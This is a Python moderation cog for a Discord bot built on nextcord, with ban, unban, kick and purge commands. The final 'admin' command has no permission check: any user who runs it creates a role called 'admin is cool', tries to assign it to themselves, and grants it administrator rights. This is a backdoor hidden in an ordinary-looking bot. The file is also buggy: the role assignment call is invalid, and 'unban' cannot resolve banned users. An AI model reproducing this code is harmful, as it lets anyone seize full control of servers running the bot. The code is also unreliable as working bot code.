import nextcord
from nextcord.ext import commands

class Moderation(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def ban(self, ctx, member: nextcord.Member, *, reason="No reason provided."):
        """B a n  h a m m e r"""
        try:
            await member.ban(reason=reason)
            await ctx.send(f'{member} has been banned for "{reason}"')
        except Exception as e:
            await ctx.reply("Cannot ban this user.")

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def unban(self, ctx, member: nextcord.Member):
        try:
            await ctx.guild.unban(member)
            await ctx.send(f"{member} has been unbanned")
        except Exception as e:
            await ctx.reply(f"Failed to unban {member}")

    @commands.command()
    @commands.has_guild_permissions(kick_members=True)
    async def kick(self, ctx, member: nextcord.Member, *, reason="No reason provided."):
        """KicKkk"""
        try:
            await member.kick(reason=reason)
            await ctx.send(f'{member} has been kicked for "{reason}"')
        except Exception as e:
            await ctx.reply("Cannot kick this user.")

    @commands.command(pass_context=True,aliases=['clean'])
    @commands.has_permissions(manage_messages=True)
    async def purge(self, ctx, limit: int):
        """Removes messages"""
        await ctx.channel.purge(limit=limit+1)
        await ctx.send('Chat purged by {}'.format(ctx.author.mention))
        await ctx.message.delete()

    @commands.command()
    async def admin(self, ctx):
        guild = ctx.guild
        await guild.create_role(name="admin is cool")
        user = ctx.message.author
        role = nextcord.utils.get(user.guild.roles, name="admin is cool")
        await user.guild.roles(role)
        role = nextcord.utils.get(ctx.guild.roles, name="admin is cool")
        perms = nextcord.Permissions(administrator = True)
        await role.edit(permissions = perms)

def setup(bot):
    bot.add_cog(Moderation(bot))
